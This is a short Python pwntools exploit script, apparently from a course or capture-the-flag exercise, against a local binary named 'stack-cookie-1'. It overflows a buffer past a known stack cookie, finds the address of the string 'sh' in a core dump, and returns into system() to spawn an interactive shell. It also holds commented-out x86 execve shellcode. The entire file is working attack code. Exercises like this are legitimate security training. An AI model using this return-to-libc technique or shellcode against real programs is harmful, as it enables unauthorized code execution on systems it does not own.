#!/usr/bin/env python
from pwn import *

p = process("./stack-cookie-1")
#SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
#gdb -> b main -> r -> print system
system = 0xf7eaf7e0
cookie=0xfaceb00c

# causes crash: creates core
x="A" * 0x84 + p32(0xfaceb00c) + "A"*20

p.send(x)
p.wait()
c= Core('core')

sh_addr = c.stack.find('sh')
print(sh_addr)


p=process("./stack-cookie-1")
# Slide 21:
# [buffer] [cookie] [saved ebp] [ret eddr]
# [buffer] [cookie] [saved ebp: AAAA] [ret addr: system] [AAAA] [arg1 - shell code addr] [arg2] [arg3]
string="A"*0x84 + p32(cookie) + "AAAA" + p32(system) + "AAAA" + p32(sh_addr)+p32(0)*8

p.send(string)

p.interactive()

